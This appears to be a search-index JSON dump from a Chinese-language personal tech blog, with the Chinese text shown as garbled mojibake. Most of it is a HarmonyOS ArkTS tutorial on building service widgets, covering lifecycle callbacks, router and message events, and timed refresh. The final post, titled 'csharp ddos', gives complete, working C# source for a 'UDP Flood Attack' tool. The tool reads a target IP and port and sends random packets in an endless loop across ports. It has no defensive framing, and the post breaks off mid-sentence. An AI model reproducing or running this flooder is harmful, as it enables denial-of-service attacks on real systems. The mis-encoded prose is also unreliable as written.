è®¾ç½®èƒŒæ™¯é¢œè‰² &#125; // åˆ¤æ–­å½“å‰æ˜¯å¦æ˜¾ç¤ºåœ°é¼ é¢ isHeadsFaceUp() &#123; let normalizedAngle = this.rotationAngle % 360; // è§„èŒƒåŒ–è§’åº¦ // åˆ¤æ–­è§’åº¦èŒƒå›´ï¼Œç¡®å®šæ˜¯å¦æ˜¾ç¤ºåœ°é¼ é¢ if (normalizedAngle &gt;= 0 &amp;&amp; normalizedAngle &lt; 90 || normalizedAngle &gt;= 270 &amp;&amp; normalizedAngle &lt;= 360) &#123; return true; // æ˜¾ç¤ºåœ°é¼ é¢ &#125; return false; // æ˜¾ç¤ºåé¢ &#125;&#125;","categories":[{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://banjinmei.github.io/categories/%E6%8A%80%E6%9C%AF/"}],"tags":[{"name":"HarmonryOS","slug":"HarmonryOS","permalink":"https://banjinmei.github.io/tags/HarmonryOS/"}],"author":"mu"},{"title":"é¸¿è’™åº”ç”¨-åŸºäºArkTSå¡ç‰‡å¼€å‘-HarmonyOSæœåŠ¡å¡ç‰‡","slug":"é¸¿è’™åº”ç”¨-åŸºäºArkTSå¡ç‰‡å¼€å‘-HarmonyOSæœåŠ¡å¡ç‰‡","date":"2024-12-13T14:45:30.000Z","updated":"2024-12-13T16:18:19.445Z","comments":true,"path":"2024/12/13/é¸¿è’™åº”ç”¨-åŸºäºArkTSå¡ç‰‡å¼€å‘-HarmonyOSæœåŠ¡å¡ç‰‡/","permalink":"https://banjinmei.github.io/2024/12/13/%E9%B8%BF%E8%92%99%E5%BA%94%E7%94%A8-%E5%9F%BA%E4%BA%8EArkTS%E5%8D%A1%E7%89%87%E5%BC%80%E5%8F%91-HarmonyOS%E6%9C%8D%E5%8A%A1%E5%8D%A1%E7%89%87/","excerpt":"","text":"é¸¿è’™åº”ç”¨-åŸºäºArkTSå¡ç‰‡å¼€å‘-HarmonyOSæœåŠ¡å¡ç‰‡æœåŠ¡å¡ç‰‡æ¶æ„å¡ç‰‡ä½¿ç”¨æ–¹ æä¾›æ–¹ ArkTSå¡ç‰‡åˆ›å»ºåˆ›å»ºæ­¥éª¤ å¡ç‰‡ç›¸å…³æ–‡ä»¶ï¼ˆå¡ç‰‡ç”Ÿå‘½å‘¨æœŸç®¡ç†æ–‡ä»¶ å¡ç‰‡é¡µé¢æ–‡ä»¶ å¡ç‰‡é…ç½®æ–‡ä»¶ï¼‰ ArkTSç”Ÿå‘½å‘¨æœŸArkTSå¡ç‰‡äº‹ä»¶å¼€å‘router message call æœåŠ¡å¡ç‰‡çš„å®šä¹‰åŠåŸºæœ¬æ¦‚å¿µå¡ç‰‡å®šä¹‰ä½œä¸ºä¸€ç§ç•Œé¢å±•ç¤ºå½¢å¼ï¼Œå¯å°†é‡è¦ä¿¡æ¯æˆ–æ“ä½œå‰ç½®åˆ°å¡ç‰‡ï¼Œä»¥è¾¾åˆ°æœåŠ¡ç›´è¾¾ã€å‡å°‘ä½“éªŒå±‚çº§çš„ç›®çš„ã€‚å¡ç‰‡å¸¸ç”¨äºåµŒå…¥å…¶ä»–ç³»ç»Ÿåº”ç”¨ä¸­ï¼Œä½œä¸ºå…¶é¡µé¢å±•ç¤ºçš„ä¸€éƒ¨åˆ†ï¼Œæ”¯æŒæ‹‰èµ·é¡µé¢ã€å‘é€æ¶ˆæ¯ç­‰åŸºç¡€äº¤äº’åŠŸèƒ½ã€‚ åŸºæœ¬æ¦‚å¿µå¡ç‰‡æä¾›æ–¹åŒ…å«å¡ç‰‡çš„åº”ç”¨ï¼Œæä¾›å¡ç‰‡çš„æ˜¾ç¤ºå†…å®¹å¯ä»¥è¿›è¡Œäº¤äº’å¦‚ç•Œé¢åˆ·æ–°ã€åº”ç”¨è·³è½¬ç­‰ã€‚å¡ç‰‡ä½¿ç”¨æ–¹å¦‚å›¾ä¸­çš„æ¡Œé¢ï¼Œæ§åˆ¶å¡ç‰‡çš„å±•ç¤ºä½ç½®ã€‚ æ”»å…‹éš¾ç‚¹1ã€åœ¨DevEco studioä¸­å¦‚ä½•åˆ›å»ºæœåŠ¡å¡ç‰‡?2ã€æœåŠ¡å¡ç‰‡å¼€å‘æ¶‰åŠå“ªäº›é‡è¦çš„é…ç½®æ–‡ä»¶?3ã€å¦‚ä½•ä½¿ç”¨routeräº‹ä»¶è·³è½¬åˆ°æŒ‡å®šUIAbilityï¼Œå®ç°æœåŠ¡ç›´è¾¾æ•ˆæœ?4ã€å¦‚ä½•å®ç°å¡ç‰‡å†…å®¹çš„å®šç‚¹å’Œå®šæ—¶åˆ·æ–°? å®æˆ˜åˆ›å»ºå¡ç‰‡é¡¹ç›®å†…å·¦ä¾§ entryå³é”® new service widget ets&#x2F;entryformabilityEntryFormAbility.ts ç”Ÿå‘½å‘¨æœŸæ–‡ä»¶ets&#x2F;widget&#x2F;pages&#x2F;WidgetCard.ets å¡ç‰‡é¡µé¢ form_config.json å¡ç‰‡é…ç½® â€œisDefaultâ€: true, &#x2F;&#x2F;é»˜è®¤æ‹‰èµ·çš„å¡ç‰‡ â€œupdateEnabledâ€: false, &#x2F;&#x2F;è¡¨ç¤ºå¡ç‰‡æ˜¯å¦æ”¯æŒå‘¨æœŸæ€§åˆ·æ–° â€œscheduledUpdateTimeâ€: â€œ10:30â€,&#x2F;&#x2F;è¡¨ç¤ºå¡ç‰‡çš„å®šç‚¹å‰§æ–°æ—¶åˆ»ï¼Œé‡‡ç”¨24å°æ—¶åˆ¶ï¼Œç²¾ç¡®åˆ°åˆ†é’Ÿ â€œupdateDurationâ€: 1, &#x2F;&#x2F;è¡¨ç¤ºå¡ç‰‡å®šæ—¶å‰§æ–°çš„æ›´æ–°å‘¨æœŸï¼Œå•ä½ä¸º30åˆ†é’Ÿï¼Œä¸¤ç§æ–¹å¼ä»»é€‰å…¶ä¸€ï¼ŒåŒæ—¶é…ç½®ï¼Œå®šæ—¶åˆ·æ–°ä¼˜å…ˆç”Ÿæ•ˆ main_pages.json è·¯ç”± è¿è¡Œå¡ç‰‡åˆ›å»ºå®Œæˆåï¼Œå¯ä»¥ç‚¹å‡»DevEcoStudioå¼€å‘å·¥å…·å³ä¸Šè§’çš„å¯åŠ¨æŒ‰é’®ï¼Œè¿è¡Œé¡¹ç›®æŸ¥çœ‹æ•ˆæœæ˜“é”™ç‚¹:é¼ æ ‡æŒ‰ä½å·¦é”®å‘ä¸Šå¿ƒæ‹–åŠ¨ï¼Œæ¢å‡ºæœåŠ¡å¡ç‰‡ã€‚ åœ¨EntryFormAbility.tsæ–‡ä»¶ä¸­å®ç°äº†FormExtensionAbilityçš„ç”Ÿå‘½å‘¨æœŸæ¥å£ï¼Œå¼€å‘è€…å¯æ ¹æ®è‡ªèº«ä¸šåŠ¡éœ€æ±‚ï¼Œè°ƒç”¨å¯¹åº”çš„æ¥å£ã€‚8å¤§ç”Ÿå‘½å‘¨æœŸexport default class EntryFormAbility extends FormExtensionAbility {onAddForm(want) {..)} åˆ›å»ºå¡ç‰‡æ—¶è§¦å‘ â˜… ä¿¡æ¯ä¼ é€’onCastToNormalForm(formld) {â€¦} ä¸´æ—¶å¡ç‰‡è½¬å¸¸æ€å¡ç‰‡æ—¶è§¦å‘**onUpdateForm(formid) **{..} å¡ç‰‡æ›´æ–°æ—¶è§¦å‘ â˜…onChangeFormVisibility(newStatus) {â€¦} ä¿®æ”¹å¡ç‰‡å¯è§æ€§æ—¶è§¦å‘onFormEvent(formld, message) {â€¦} å¤„ç†å¡ç‰‡äº‹ä»¶æ—¶è§¦å‘ â˜…onRemoveForm(formld){â€¦} å¡ç‰‡é”€æ¯æ—¶è§¦å‘nConfigurationUpdate(config) {â€¦} ç³»ç»Ÿé…ç½®æ›´æ–°æ—¶è§¦å‘onAcquireFormState(want){â€¦} æŸ¥è¯¢å¡ç‰‡çŠ¶æ€æ—¶è§¦å‘ å¡ç‰‡äº‹ä»¶å¼€å‘ArKTSå¡ç‰‡æä¾›äº†**postCardAction()**æ¥å£ï¼Œç”¨äºå¡ç‰‡å†…éƒ¨å’Œæä¾›æ–¹åº”ç”¨é—´çš„äº¤äº’ï¼Œå½“å‰æ”¯æŒrouterã€messageå’Œcallä¸‰ç§ç±»å‹çš„äº‹ä»¶ï¼Œä»…åœ¨å¡ç‰‡ä¸­å¯ä»¥è°ƒç”¨ã€‚ å¡ç‰‡é¡µé¢æ–‡ä»¶(WidegetCard.ets)postCardAction-&gt; message -&gt;è§¦å‘onFormEvent-&gt; FormExtensionAbility(EntryFormAbility.ts) å¡ç‰‡é¡µé¢æ–‡ä»¶(WidegetCard.ets)postCardAction-&gt;router-&gt;é¦–æ¬¡å¯åŠ¨è§¦å‘onCreateéé¦–æ¬¡å¯åŠ¨è§¦å‘onNewWantUlAbility(EntryAbility.ts)-&gt;call-&gt;é¦–æ¬¡å¯åŠ¨è§¦å‘onCreateUlAbility(EntryAbility.ts) å¡ç‰‡äº‹ä»¶-routerä½¿ç”¨routeräº‹ä»¶è·³è½¬åˆ°æŒ‡å®šUIAbilityã€‚&gt;åœ¨å¡ç‰‡é¡µé¢æ–‡ä»¶ä¸­è°ƒç”¨routeräº‹ä»¶èƒ½å¤Ÿå¿«é€Ÿæ‹‰èµ·å¡ç‰‡æä¾›æ–¹åº”ç”¨çš„æŒ‡å®šUIAbilityï¼Œå®ç°ä¸€é”®ç›´è¾¾çš„æ•ˆæœã€‚åœ¨UlAbilityçš„EntryAbility.tsæ–‡ä»¶ä¸­æ¥æ”¶routeräº‹ä»¶å¹¶è·å–å‚æ•°ï¼Œæ ¹æ®ä¼ é€’çš„paramsä¸åŒï¼Œé€‰æ‹©æ‹‰èµ·ä¸åŒçš„é¡µé¢ã€‚ ##å¡ç‰‡äº‹ä»¶-messageåˆ·æ–°å¡ç‰‡ (ç‚¹å‡» )åœ¨EntryFormAbility.tsæ–‡ä»¶ä¸­çš„onFormEventç”Ÿå‘½å‘¨æœŸä¸­è°ƒç”¨updateFormæ¥å£åˆ·æ–°å¡ç‰‡ã€‚ å¡ç‰‡äº‹ä»¶-æ•°æ®äº¤äº’æœ‰æ—¶åœ¨åˆ·æ–°å¡ç‰‡å†…å®¹æ—¶ï¼Œæˆ‘ä»¬å¸Œæœ›å®ç°å®šæ—¶åˆ·æ–°æˆ–è€…å®šç‚¹åˆ·æ–°ï¼Œæ— éœ€æ‰‹åŠ¨åˆ·æ–°ã€‚å®šæ—¶åˆ·æ–°:è¡¨ç¤ºåœ¨ä¸€å®šæ—¶é—´é—´éš”å†…è°ƒç”¨onUpdateFormçš„ç”Ÿå‘½å‘¨æœŸå›è°ƒå‡½æ•°è‡ªåŠ¨åˆ·æ–°å¡ç‰‡å†…å®¹ã€‚å¯ä»¥åœ¨form config.jsoné…ç½®æ–‡ä»¶çš„updateDurationå­—æ®µä¸­è¿›è¡Œè®¾ç½®ã€‚å®šç‚¹åˆ·æ–°:è¡¨ç¤ºæ¯å¤©åœ¨æŸä¸ªæ—¶é—´ç‚¹åˆ·æ–°ï¼Œåœ¨form config.jsonæ–‡ä»¶çš„scheduledUpdateTimeå­—æ®µè¿›è¡Œè®¾ç½®ã€‚(è‡ªåŠ¨) åœ¨è§¦å‘å®šæ—¶æˆ–å®šç‚¹åˆ·æ–°åï¼Œç³»ç»Ÿä¼šè°ƒç”¨ntryFormAbility.tsæ–‡ä»¶ä¸­çš„ç”Ÿå‘½å‘¨æœŸå›è°ƒonUpdateFormï¼Œåœ¨å›è°ƒä¸­å¯ä»¥ä½¿ç”¨updateFormè¿›è¡Œæä¾›æ–¹åˆ·æ–°å¡ç‰‡ã€‚ ä½¿ç”¨å£°æ˜å¼èŒƒå¼å¼€å‘ArkTSå¡ç‰‡é¡µé¢ï¼Œåœ¨WallPaperCard.etsæ–‡ä»¶ï¼ˆå³å¡ç‰‡çš„é¡µé¢æ–‡ä»¶ï¼‰ä¸­å®Œæˆå¡ç‰‡çš„UIç•Œé¢æ„å»º ä½¿ç”¨routeräº‹ä»¶è·³è½¬åˆ°æŒ‡å®šUIAbilityå½“æˆ‘ä»¬ç‚¹å‡»å¡ç‰‡æ—¶ï¼Œå¸Œæœ›è·³è½¬åˆ°åº”ç”¨çš„ä¸»é¡µé¢ï¼Œä»”ç»†åˆ†æï¼Œè¯¥åŠŸèƒ½å¯æ‹†åˆ†ä¸ºä»¥ä¸‹ä¸¤ä¸ªéƒ¨åˆ†å®ç°ï¼š é¦–å…ˆï¼Œåœ¨WallPaperCard.etså¡ç‰‡é¡µé¢ä¸­è°ƒç”¨postCardActionå‘æŒ‡å®šEntryAbilityå‘é€routeräº‹ä»¶ï¼Œå¹¶åœ¨äº‹ä»¶å†…å®šä¹‰éœ€è¦ä¼ é€’çš„å†…å®¹ã€‚ å…¶æ¬¡ï¼Œåœ¨EntryAbilityä¸­æ¥æ”¶routeräº‹ä»¶å¹¶è·å–å‚æ•°ï¼Œæ ¹æ®ä¼ é€’çš„paramsä¸åŒï¼Œé€‰æ‹©æ‹‰èµ·ä¸åŒçš„é¡µé¢ã€‚åœ¨WallPaperCard.etså¡ç‰‡é¡µé¢ä¸­è°ƒç”¨postCardActionæ¥å£å‘EntryAbilityå‘é€routeräº‹ä»¶ï¼Œä»è€Œæ‹‰èµ·EntryAbilityï¼›æ­¤æ—¶ï¼Œåªéœ€åœ¨WallPaperCard.etsçš„é¡µé¢å¸ƒå±€ä¸­è®¾å®šä¸€ä¸ªç‚¹å‡»äº‹ä»¶ï¼Œå½“ç”¨æˆ·ç‚¹å‡»å¡ç‰‡æ—¶ï¼Œå³å¯è·³è½¬è‡³åº”ç”¨çš„è¯¦æƒ…é¡µé¢ï¼Œè¿™é‡Œç»™æœ€å¤–å±‚çš„æ ¹å®¹å™¨ç»„ä»¶Rowç»‘å®šä¸€ä¸ªç‚¹å‡»äº‹ä»¶ï¼Œåœ¨å…¶ä¸­å®Œæˆè°ƒç”¨postCardActionæ¥å£å‘EntryAbilityå‘é€routeräº‹ä»¶çš„æ“ä½œ 12345678910//WallPaperCard.ets .onClick(() =&gt; &#123; //ä½¿ç”¨router,æ‹‰èµ·EntryAbilityå¹¶è·³è½¬åˆ°å¯¹åº”çš„è¯¦æƒ…é¡µé¢ postCardAction(this, &#123; &quot;action&quot;: this.ACTION_TYPE, &quot;abilityName&quot;: this.ABILITY_NAME, &quot;params&quot;: &#123; &#x27;targetPage&#x27;: &#x27;home&#x27; // åœ¨EntryAbilityä¸­å¤„ç†è¿™ä¸ªä¿¡æ¯ &#125; &#125;); &#125;) åœ¨WallPaperCard.etså¡ç‰‡é¡µé¢ä¸­å‘EntryAbilityå‘é€routeräº‹ä»¶åï¼Œéœ€è¦åœ¨EntryAbility.tsæ–‡ä»¶ä¸­æ¥æ”¶routeräº‹ä»¶ï¼Œå¹¶è·å–äº‹ä»¶ä¸­æºå¸¦çš„å‚æ•°ï¼Œé€šè¿‡ä¼ é€’çš„å‚æ•°é€‰æ‹©æ‹‰èµ·ä¸åŒçš„é¡µé¢ï¼Œè¿™é‡Œæ˜¯æ‹‰èµ·ä¸»é¡µé¢ 123456789101112131415161718192021//EntryAbility.ts onCreate(want, launchParam) &#123; // å¦‚æœUIAbilityç¬¬ä¸€æ¬¡å¯åŠ¨ï¼Œåœ¨æ”¶åˆ°å¡ç‰‡çš„Routeräº‹ä»¶åä¼šè§¦å‘onCreateç”Ÿå‘½å‘¨æœŸå›è°ƒ // è·å–routeräº‹ä»¶ä¸­ä¼ é€’çš„targetPageå‚æ•° if (want.parameters.params !== undefined) &#123; let params = JSON.parse(want.parameters.params); selectPage = params.targetPage; &#125; &#125; // å¦‚æœUIAbilityæ˜¯éé¦–æ¬¡å¯åŠ¨ï¼Œåœ¨æ”¶åˆ°å¡ç‰‡Routeräº‹ä»¶åä¼šè§¦å‘onNewWantç”Ÿå‘½å‘¨æœŸå›è°ƒ onNewWant(want, launchParam) &#123; if (want.parameters.params !== undefined) &#123; // åŒæ ·,è·å–routeräº‹ä»¶ä¸­ä¼ é€’çš„targetPageå‚æ•° let params = JSON.parse(want.parameters.params); selectPage = params.targetPage; &#125; if (currentWindowStage != null) &#123; this.onWindowStageCreate(currentWindowStage); &#125; &#125; ä½¿ç”¨message äº‹ä»¶åˆ·æ–°å¡ç‰‡å†…å®¹åœ¨å¡ç‰‡çš„ä½¿ç”¨è¿‡ç¨‹ä¸­ï¼Œæˆ‘ä»¬å¸Œæœ›å¯ä»¥é€šè¿‡ç‚¹å‡»å¡ç‰‡ä¸­çš„åˆ·æ–°æŒ‰é’®ï¼Œå®ç°å¡ç‰‡å†…å®¹çš„æ›´æ–°ï¼Œæ­¤æ—¶å¯ä»¥åœ¨WallPaperCard.etsä¸­è°ƒç”¨postCardActionæ¥å£è§¦å‘messageäº‹ä»¶æ‹‰èµ·FormExtensionAbilityï¼Œç„¶åç”±FormExtensionAbilityåˆ·æ–°å¡ç‰‡å†…å®¹ã€‚ä»”ç»†åˆ†æï¼Œä¸Šè¿°æ•ˆæœå¯æ‹†åˆ†ä¸ºä»¥ä¸‹ä¸¤ä¸ªéƒ¨åˆ†å®ç°ï¼š é¦–å…ˆï¼Œåœ¨å¡ç‰‡é¡µé¢ä¸­ç»™Buttonç»„ä»¶ç»‘å®šç‚¹å‡»äº‹ä»¶ï¼Œåœ¨å…¶ä¸­è°ƒç”¨postCardActionæ¥å£è§¦å‘messageäº‹ä»¶æ‹‰èµ·FormExtensionAbilityã€‚ å…¶æ¬¡ï¼Œåœ¨EntryFormAbility.tsçš„onFormEventç”Ÿå‘½å‘¨æœŸä¸­è°ƒç”¨updateFormæ¥å£åˆ·æ–°å¡ç‰‡ã€‚åœ¨WallPaperCard.etså¡ç‰‡é¡µé¢ä¸­ç»™Buttonç»„ä»¶ç»‘å®šç‚¹å‡»äº‹ä»¶ï¼Œåœ¨å…¶ä¸­è°ƒç”¨postCardActionæ¥å£è§¦å‘messageäº‹ä»¶æ‹‰èµ·FormExtensionAbility 12345678.onClick(() =&gt; &#123; //ç‚¹å‡»åˆ·æ–°æŒ‰é’®,é€šè¿‡messageäº‹ä»¶åˆ·æ–°å¡ç‰‡æ•°æ® postCardAction(this, &#123; &#x27;action&#x27;: this.ACTION_TYPE2, &#x27;params&#x27;: &#123; &#x27;msgTest&#x27;: &#x27;messageEvent&#x27; &#125; &#125;); &#125;) åœ¨EntryFormAbility.tsçš„onFormEventç”Ÿå‘½å‘¨æœŸä¸­è°ƒç”¨updateFormæ¥å£åˆ·æ–°å¡ç‰‡ 12345678910111213onFormEvent(formId, message) &#123; // é€šè¿‡messagesäº‹ä»¶åˆ·æ–°,å°±ä¼šè§¦å‘è¯¥å›è°ƒ let formData = &#123; &#x27;recommend&#x27;: &#x27;messageåˆ·æ–°&#x27;, //è¦åˆ·æ–°çš„å…·ä½“å†…å®¹ï¼Œå’Œå¡ç‰‡å¸ƒå±€ä¸­å¯¹åº” &#125;; let formInfo = formBindingData.createFormBindingData(formData) //è°ƒç”¨updateFormæ¥å£åˆ·æ–°å¡ç‰‡ formProvider.updateForm(formId, formInfo).then((data) =&gt; &#123; console.info(&#x27;FormAbility updateForm success.&#x27; + JSON.stringify(data)); &#125;).catch((error) =&gt; &#123; console.error(&#x27;FormAbility updateForm failed: &#x27; + JSON.stringify(error)); &#125;)&#125; å¡ç‰‡æ•°æ®äº¤äº’å¡ç‰‡çš„å®šæ—¶åˆ·æ–°åœ¨å¡ç‰‡çš„ä½¿ç”¨è¿‡ç¨‹ä¸­ï¼Œæœ‰æ—¶å€™æˆ‘ä»¬å¸Œæœ›å¡ç‰‡çš„å†…å®¹å¯ä»¥å®šæ—¶è‡ªåŠ¨åˆ·æ–°,æ¯”å¦‚æ¯éš”0.5å°æ—¶åˆ·æ–°ä¸€æ¬¡ï¼›å®šæ—¶åˆ·æ–°çš„åŠŸèƒ½æ•ˆæœï¼ŒåŒæ ·å¯æ‹†åˆ†ä¸ºä»¥ä¸‹ä¸¤ä¸ªéƒ¨åˆ†å®ç°ï¼š é¦–å…ˆï¼Œéœ€è¦åœ¨â€œresources&gt;base&gt;profileâ€ç›®å½•ä¸‹çš„form_config.jsoné…ç½®æ–‡ä»¶ä¸­å¯¹updateDurationå­—æ®µè¿›è¡Œè®¾ç½®ã€‚ å…¶æ¬¡ï¼Œåœ¨è§¦å‘å®šæ—¶åˆ·æ–°åï¼Œç³»ç»Ÿä¼šè°ƒç”¨EntryFormAbility.tsä¸­çš„onUpdateFormç”Ÿå‘½å‘¨æœŸå›è°ƒï¼Œåœ¨å›è°ƒä¸­ï¼Œå¯ä»¥ä½¿ç”¨updateFormè¿›è¡Œæä¾›æ–¹åˆ·æ–°å¡ç‰‡ã€‚å®šæ—¶åˆ·æ–°çš„æ—¶é—´é—´éš”å•ä½ä¸º30åˆ†é’Ÿï¼Œå› æ­¤æ¯éš”0.5å°æ—¶åˆ·æ–°ï¼Œåˆ™updateDurationå­—æ®µå€¼åº”è¯¥è®¾ä¸º1ï¼ŒåŒæ—¶å°†updateEnabledå­—æ®µå€¼è®¾ä¸ºtrue EntryFormAbility.tsä¸­çš„onUpdateFormç”Ÿå‘½å‘¨æœŸå›è°ƒå…·ä½“ä»£ç å¦‚ä¸‹æ‰€ç¤ºï¼š 12345678910111213onUpdateForm(formId) &#123; //è®¾ç½®å®šæ—¶æˆ–å®šç‚¹æ›´æ–°å,ç³»ç»Ÿå°±ä¼šè§¦å‘è¯¥å›è°ƒ let formData = &#123; &#x27;recommend2&#x27;: &#x27;å®šæ—¶åˆ·æ–°&#x27;, //è¦åˆ·æ–°çš„å…·ä½“å†…å®¹ï¼Œå’Œå¡ç‰‡å¸ƒå±€ä¸­å¯¹åº” &#125;; let formInfo = formBindingData.createFormBindingData(formData) // è°ƒç”¨updateFormæ¥å£åˆ·æ–°å¡ç‰‡ formProvider.updateForm(formId, formInfo).then((data) =&gt; &#123; console.info(&#x27;FormAbility updateForm success.&#x27; + JSON.stringify(data)); &#125;).catch((error) =&gt; &#123; console.error(&#x27;FormAbility updateForm failed: &#x27; + JSON.stringify(error)); &#125;) &#125; å¡ç‰‡çš„å®šç‚¹åˆ·æ–°åœ¨å¡ç‰‡çš„ä½¿ç”¨è¿‡ç¨‹ä¸­ï¼Œæœ‰æ—¶å€™æˆ‘ä»¬å¸Œæœ›å¡ç‰‡çš„å†…å®¹å¯ä»¥å®šç‚¹è‡ªåŠ¨åˆ·æ–°ï¼Œæ¯”å¦‚æ¯å¤©ä¸Šåˆçš„10:30å°±è‡ªåŠ¨åˆ·æ–°å¡ç‰‡å†…å®¹ï¼Œå®šç‚¹åˆ·æ–°çš„åŠŸèƒ½æ•ˆæœï¼ŒåŒæ ·å¯æ‹†åˆ†ä¸ºä»¥ä¸‹ä¸¤ä¸ªéƒ¨åˆ†å®ç°ï¼š é¦–å…ˆï¼Œéœ€è¦åœ¨â€œresources&gt;base&gt;profileâ€ç›®å½•ä¸‹çš„form_config.jsoné…ç½®æ–‡ä»¶ä¸­å¯¹scheduledUpdateTimeå­—æ®µè¿›è¡Œè®¾ç½®ã€‚ å…¶æ¬¡ï¼Œåœ¨è§¦å‘å®šç‚¹åˆ·æ–°åï¼Œç³»ç»Ÿä¼šè°ƒç”¨EntryFormAbility.tsä¸­çš„onUpdateFormç”Ÿå‘½å‘¨æœŸå›è°ƒï¼Œåœ¨å›è°ƒä¸­ï¼Œå¯ä»¥ä½¿ç”¨updateFormè¿›è¡Œæä¾›æ–¹åˆ·æ–°å¡ç‰‡ã€‚éœ€è¦æ³¨æ„çš„æ˜¯ï¼Œå®šæ—¶åˆ·æ–°ä¸å®šç‚¹åˆ·æ–°ä¹‹é—´å­˜åœ¨ä¼˜å…ˆçº§é—®é¢˜ï¼ŒupdateDurationï¼ˆå®šæ—¶åˆ·æ–°ï¼‰ä¼˜å…ˆçº§æ¯”scheduledUpdateTimeï¼ˆå®šç‚¹åˆ·æ–°ï¼‰é«˜ï¼Œé…ç½®å®šæ—¶åˆ·æ–°åï¼Œå®šç‚¹åˆ·æ–°å°†å¤±æ•ˆã€‚å¦‚æœåŒæ—¶é…ç½®äº†updateDurationï¼ˆå®šæ—¶åˆ·æ–°ï¼‰å’ŒscheduledUpdateTimeï¼ˆå®šç‚¹åˆ·æ–°ï¼‰ï¼Œæƒ³è¦å®šç‚¹åˆ·æ–°ç”Ÿæ•ˆï¼Œåˆ™éœ€è¦å°†updateDurationé…ç½®ä¸º0ã€‚æ­¤å¤„å¦‚æƒ³å®ç°æ¯å¤©10:30å®šç‚¹åˆ·æ–°å¡ç‰‡å†…å®¹ï¼Œåˆ™é¡»åœ¨é…ç½®æ–‡ä»¶ä¸­å°†updateDurationé…ç½®ä¸º0ï¼ŒåŒæ—¶scheduledUpdateTimeè®¾ç½®ä¸º10:30ï¼Œå°†updateEnabledå­—æ®µå€¼è®¾ä¸ºtrue åŒæ ·åœ°ï¼Œå®šç‚¹åˆ·æ–°è§¦å‘åï¼Œç³»ç»Ÿä¼šè‡ªåŠ¨è°ƒç”¨EntryFormAbility.tsä¸­çš„onUpdateFormç”Ÿå‘½å‘¨æœŸå›è°ƒï¼ŒonUpdateFormå…·ä½“ä»£ç å¦‚ä¸‹æ‰€ç¤ºï¼š 1234567891011121314onUpdateForm(formId) &#123; //è®¾ç½®å®šæ—¶æˆ–å®šç‚¹æ›´æ–°å,ç³»ç»Ÿå°±ä¼šè§¦å‘è¯¥å›è°ƒ let formData = &#123; //&#x27;recommend2&#x27;: &#x27;å®šæ—¶åˆ·æ–°&#x27; &#x27;recommend3&#x27;: &#x27;å®šç‚¹åˆ·æ–°&#x27;, //è¦åˆ·æ–°çš„å…·ä½“å†…å®¹ï¼Œå’Œå¡ç‰‡å¸ƒå±€ä¸­å¯¹åº” &#125;; let formInfo = formBindingData.createFormBindingData(formData) // è°ƒç”¨updateFormæ¥å£åˆ·æ–°å¡ç‰‡ formProvider.updateForm(formId, formInfo).then((data) =&gt; &#123; console.info(&#x27;FormAbility updateForm success.&#x27; + JSON.stringify(data)); &#125;).catch((error) =&gt; &#123; console.error(&#x27;FormAbility updateForm failed: &#x27; + JSON.stringify(error)); &#125;) &#125; tips:å¦‚æœåœ¨è¿‡ç¨‹ä¸­å‘ç°å®šç‚¹åˆ·æ–°å§‹ç»ˆæ— æ³•ç”Ÿæ•ˆï¼Œè¯·å…ˆæ’æŸ¥æ¨¡æ‹Ÿå™¨ä¸­çš„æ—¶é—´æ˜¯å¦å’ŒçœŸå®çš„æ ‡å‡†æ—¶é—´ä¸€è‡´ï¼Œå¦‚æœä¸ä¸€è‡´ï¼Œå¯ç›´æ¥åœ¨æ¨¡æ‹Ÿå™¨è®¾ç½®ä¸­å®Œæˆæ—¶é—´æ ¡å‡†ï¼Œä¾‹å¦‚å®šç‚¹åˆ·æ–°æ—¶é—´ä¸º10:30ï¼Œåˆ™åœ¨è®¾ç½®ä¸­å°†æ—¶é—´è°ƒæ•´ä¸º10ï¼š29ï¼ˆå› ä¸ºé¡¹ç›®é‡å¯éœ€è¦æ—¶é—´ç¼–è¯‘ï¼‰ï¼Œé‡å¯é¡¹ç›®å·¥ç¨‹~","categories":[{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://banjinmei.github.io/categories/%E6%8A%80%E6%9C%AF/"}],"tags":[{"name":"HarmonyOS","slug":"HarmonyOS","permalink":"https://banjinmei.github.io/tags/HarmonyOS/"},{"name":"ArkTS","slug":"ArkTS","permalink":"https://banjinmei.github.io/tags/ArkTS/"}],"author":"mu"},{"title":"csharp ddos","slug":"csharp-ddos","date":"2024-12-11T13:19:04.000Z","updated":"2024-12-11T14:10:59.439Z","comments":true,"path":"2024/12/11/csharp-ddos/","permalink":"https://banjinmei.github.io/2024/12/11/csharp-ddos/","excerpt":"","text":"UDP åŒ…å‘123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778using System;using System.Net;using System.Net.Sockets;using System.Text;using System.Threading;class Program&#123; static void Main(string[] args) &#123; Console.Clear(); Console.WriteLine(&quot;UDP Flood Attack&quot;); Console.WriteLine(); // è·å–ç›®æ ‡ IP å’Œç«¯å£ Console.Write(&quot;IP Target : &quot;); string ip = Console.ReadLine(); Console.Write(&quot;Port : &quot;); int port = int.Parse(Console.ReadLine()); // å‡†å¤‡ UDP å®¢æˆ·ç«¯ UdpClient udpClient = new UdpClient(); byte[] bytes = new byte[1490]; new Random().NextBytes(bytes); // ç”Ÿæˆéšæœºå­—èŠ‚æ•°æ® // æ¨¡æ‹Ÿè¿›åº¦æ¡ Console.Clear(); Console.WriteLine(&quot;Attack Starting&quot;); ShowProgressBar(); // å¼€å§‹å‘é€ UDP æ•°æ®åŒ… int sent = 0; while (true) &#123; try &#123; udpClient.Send(bytes, bytes.Length, ip, port); sent++; Console.WriteLine($&quot;Sent &#123;sent&#125; packets to &#123;ip&#125; through port: &#123;port&#125;&quot;); // å¢åŠ ç«¯å£å· port++; if (port &gt; 65534) &#123; port = 1; &#125; &#125; catch (Exception ex) &#123; Console.WriteLine($&quot;Error: &#123;ex.Message&#125;&quot;); break; &#125; &#125; &#125; static void ShowProgressBar() &#123; int[] delays = &#123; 5, 5, 5, 5 &#125;; string[] progress = &#123; &quot;[ ] 0% &quot;, &quot;[===== ] 25%&quot;, &quot;[========== ] 50%&quot;, &quot;[=============== ] 75%&quot;, &quot;[====================] 100%&quot; &#125;; for (int i = 0; i &lt; progress.Length; i++) &#123; Console.WriteLine(progress[i]); if (i &lt; delays.Length) &#123; Thread.Sleep(delays[i] * 1000); // æ¨¡æ‹Ÿå»¶è¿Ÿ &#125; &#125; &#125;&#125; UDP æ•°æ®åŒ…å‘é€ï¼š ä½¿ç”¨ C# çš„ UdpClient ç±»å‘é€ 